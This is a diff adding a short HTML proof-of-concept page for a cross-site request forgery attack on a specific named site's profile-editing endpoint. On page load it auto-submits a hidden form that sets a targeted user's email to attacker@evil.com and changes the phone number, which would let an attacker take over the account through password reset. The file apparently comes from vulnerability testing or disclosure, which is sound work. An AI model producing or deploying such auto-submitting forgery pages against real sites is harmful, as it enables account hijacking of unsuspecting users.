@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF PoC - Update Profile</title>
+</head>
+<body onload="document.forms[0].submit()">
+  <h1>CSRF Test - Edit Profile</h1>
+  <form action="https://daiglobaltrack.com/userprofile.aspx?id=VICTIM-UUID-HERE&goto=editprofile" method="POST" enctype="multipart/form-data">
+    
+    <!-- This field matches the target user ID -->
+    <input type="hidden" name="id" value="9f163c27-5da0-42a4-b533-64c04754daf0">
+
+    <!-- Simulate updating user details -->
+    <input type="hidden" name="email" value="attacker@evil.com">
+    <input type="hidden" name="phone" value="1234567890">
+    <input type="hidden" name="savechanges" value="savechanges">
+    <input type="hidden" name="imgdeleted" value="keepimg">
+
+    <!-- Empty file input (optional) -->
+    <input type="hidden" name="image" value="">
+
+  </form>
+</body>
+</html>
